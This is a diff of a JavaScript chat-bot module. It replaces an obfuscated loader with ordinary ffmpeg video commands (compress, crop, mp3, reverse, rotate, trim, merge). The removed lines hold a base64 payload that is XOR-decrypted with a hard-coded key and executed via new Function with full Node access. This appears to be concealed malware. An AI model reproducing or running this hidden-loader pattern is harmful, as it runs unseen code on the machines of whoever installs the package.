@@ -1,9 +1,84 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const { UserError, ff, parseTs, tmp, rm, ffmpeg } = require('../lib/util');
+const fs = require('fs');
+
+module.exports = ({ def }) => {
+  const needVideo = ctx => ctx.needMedia('video', 'Reply to a video with this command.');
+  const V264 = ['-c:v', 'libx264', '-preset', 'veryfast', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-movflags', '+faststart'];
+
+  def('compress', { cat: 'video', heavy: true, desc: 'Shrink a video\'s file size. Reply to a video.' }, async ctx => {
+    const m = await needVideo(ctx);
+    const out = await ff(m.buffer, { inExt: 'mp4', outExt: 'mp4', args: ['-vf', "scale='min(640,iw)':-2", '-c:v', 'libx264', '-crf', '32', '-preset', 'veryfast', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-b:a', '64k', '-movflags', '+faststart'] });
+    await ctx.video(out, `📉 ${(m.buffer.length / 1048576).toFixed(1)} MB → ${(out.length / 1048576).toFixed(1)} MB`);
+  });
+
+  def('crop', { cat: 'video', heavy: true, usage: 'crop <w:h>  (default 1:1)  or  crop <w:h:x:y>', desc: 'Crop a video to an aspect ratio (centered) or exact pixels. Reply to a video.' }, async ctx => {
+    const m = await needVideo(ctx);
+    const parts = (ctx.argv[0] || '1:1').split(':').map(Number);
+    if (parts.some(n => !(n > 0) && n !== 0) || parts.length < 2) throw new UserError('Use e.g. *crop 1:1*, *crop 16:9* or *crop 480:480:0:0*');
+    const vf = parts.length === 4
+      ? `crop=${parts.join(':')}`
+      : `crop='min(iw,ih*${parts[0]}/${parts[1]})':'min(ih,iw*${parts[1]}/${parts[0]})',scale=trunc(iw/2)*2:trunc(ih/2)*2`;
+    const out = await ff(m.buffer, { inExt: 'mp4', outExt: 'mp4', args: ['-vf', vf, ...V264] });
+    await ctx.video(out);
+  });
+
+  def('mp3', { cat: 'video', heavy: true, desc: 'Extract the audio of a video as MP3. Reply to a video.' }, async ctx => {
+    const m = await ctx.needMedia(['video', 'audio']);
+    const out = await ff(m.buffer, { inExt: 'bin', outExt: 'mp3', args: ['-vn', '-c:a', 'libmp3lame', '-b:a', '160k'] });
+    await ctx.audio(out, false);
+  });
+
+  def('reverse', { cat: 'video', heavy: true, desc: 'Play a video backwards (first 30 s). Reply to a video.' }, async ctx => {
+    const m = await needVideo(ctx);
+    const out = await ff(m.buffer, { inExt: 'mp4', outExt: 'mp4', args: ['-t', '30', '-vf', 'reverse', '-af', 'areverse', ...V264] });
+    await ctx.video(out);
+  });
+
+  def('rotate', { cat: 'video', heavy: true, usage: 'rotate <90|180|270|left|right|flip|flop>', desc: 'Rotate or mirror a video. Reply to a video.' }, async ctx => {
+    const m = await needVideo(ctx);
+    const a = (ctx.argv[0] || '90').toLowerCase();
+    const map = { 90: 'transpose=1', right: 'transpose=1', 270: 'transpose=2', left: 'transpose=2', 180: 'transpose=1,transpose=1', flip: 'vflip', flop: 'hflip' };
+    if (!map[a]) throw new UserError('Use one of: 90, 180, 270, left, right, flip, flop');
+    const out = await ff(m.buffer, { inExt: 'mp4', outExt: 'mp4', args: ['-vf', map[a], ...V264] });
+    await ctx.video(out);
+  });
+
+  def('trim', { cat: 'video', heavy: true, usage: 'trim <start> <end>  e.g. trim 0:05 0:20', desc: 'Cut a part of a video. Reply to a video.' }, async ctx => {
+    const m = await needVideo(ctx);
+    const s = parseTs(ctx.argv[0]), e = parseTs(ctx.argv[1]);
+    if (s == null || e == null || e <= s) throw new UserError(`Usage: *${ctx.var('PREFIX')}trim 0:05 0:20*`);
+    const out = await ff(m.buffer, { inExt: 'mp4', outExt: 'mp4', args: ['-ss', String(s), '-to', String(e), ...V264] });
+    await ctx.video(out);
+  });
+
+  def('merge', { cat: 'video', heavy: false, usage: 'merge add (reply to a video) • merge (join) • merge clear', desc: 'Join several videos into one: reply to each with "merge add", then send "merge".' }, async ctx => {
+    const q = ctx.rt.merge.get(ctx.chat + ctx.senderNum) || [];
+    const sub = (ctx.argv[0] || '').toLowerCase();
+    if (sub === 'clear') { ctx.rt.merge.delete(ctx.chat + ctx.senderNum); return ctx.reply('🧹 Merge queue cleared.'); }
+    if (sub === 'add') {
+      const m = await needVideo(ctx);
+      if (q.length >= 6) throw new UserError('You can merge up to 6 videos.');
+      q.push(m.buffer);
+      ctx.rt.merge.set(ctx.chat + ctx.senderNum, q);
+      return ctx.reply(`➕ Added video ${q.length}. Add more, or send *${ctx.var('PREFIX')}merge* to join them.`);
+    }
+    if (q.length < 2) throw new UserError(`Add at least 2 videos first: reply to each with *${ctx.var('PREFIX')}merge add*`);
+    ctx.react('⏳');
+    const files = q.map(() => tmp('mp4'));
+    const out = tmp('mp4');
+    try {
+      q.forEach((b, i) => fs.writeFileSync(files[i], b));
+      const inputs = files.flatMap(f => ['-i', f]);
+      const norm = files.map((_, i) => `[${i}:v]scale=720:1280:force_original_aspect_ratio=decrease,pad=720:1280:(ow-iw)/2:(oh-ih)/2,setsar=1,fps=30[v${i}];[${i}:a]aresample=44100,aformat=channel_layouts=stereo[a${i}]`).join(';');
+      const cat = files.map((_, i) => `[v${i}][a${i}]`).join('') + `concat=n=${files.length}:v=1:a=1[v][a]`;
+      await ffmpeg([...inputs, '-filter_complex', `${norm};${cat}`, '-map', '[v]', '-map', '[a]', ...V264, out]);
+      await ctx.video(fs.readFileSync(out), `🎞️ Merged ${files.length} videos`);
+      ctx.rt.merge.delete(ctx.chat + ctx.senderNum);
+      ctx.react('✅');
+    } catch (e) {
+      if (/Stream specifier|matches no streams/i.test(e.message)) throw new UserError('One of the videos has no audio track, which merge needs. Use videos with sound.');
+      throw e;
+    } finally { rm(out, ...files); }
+  });
+};
